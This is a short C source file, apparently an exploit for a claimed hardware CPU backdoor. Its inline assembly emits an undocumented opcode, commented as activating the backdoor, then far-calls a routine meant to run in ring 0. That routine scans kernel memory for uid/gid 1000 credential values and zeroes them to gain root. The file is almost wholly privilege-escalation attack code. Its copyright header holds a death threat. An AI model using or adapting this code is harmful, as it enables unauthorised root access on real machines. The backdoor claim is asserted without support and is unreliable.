/*
 ============================================================================
 Name        : kernel_space_hack.c
 Author      : Adam Kostrzewa
 Version     :
 Copyright   : You cant copy anything, if you will I will find you and kill you
 Description : Hardware, CPU backdoor exploit
 ============================================================================
 */
#include<stdio.h>
#include<stdlib.h>

#define KSTACKBASE   0xc0000000
#define KSTACKTOP    0xff000000
#define GDT_ENTRY_KERNEL_CS		12
#define GDT_ENTRY_KERNEL_DS		13
#define __KERNEL_CS			(GDT_ENTRY_KERNEL_CS*8)
#define __KERNEL_DS			(GDT_ENTRY_KERNEL_DS*8)

// that we will try to modify
/* kern_f : function to be executed in ring 0 */
void kern_f(void) {

	unsigned int uid = 1000;
	unsigned int gid = 1000;
	unsigned int *p;
	p = (unsigned int *)KSTACKBASE;
	int found = 0;
	while ( p < (unsigned int *)KSTACKTOP) {

	if (
	 p[0] == uid && p[1] == gid &&
	 p[2] == uid && p[3] == gid &&
	 p[4] == uid && p[5] == gid &&
	 p[6] == uid && p[7] == gid)
		{

		p[0] = p[1] = p[2] = p[3] = 0;
		p[4] = p[5] = p[6] = p[7] = 0;

		found++;
			if (found == 2 ) {
				__asm__(".byte 0xcb\n");

			}
		}

		p++;

    }

}


int main(void)
{
	printf("start\n");
	__asm__ (
		"push %eax\n"
		"push %ebx\n"
	    ".byte 0xd6\n" // salc instruction - CPU backdoor activation
		"nop\n" //CPL shoud be set to 0
		"movw	$0x68, %ax\n"
		"movw	%ax, %ss\n"
		"movw	%ax, %fs\n"
		"movw	%ax, %gs\n"
		"lcall	$0x60, $kern_f\n"
	);
	return 1;
}
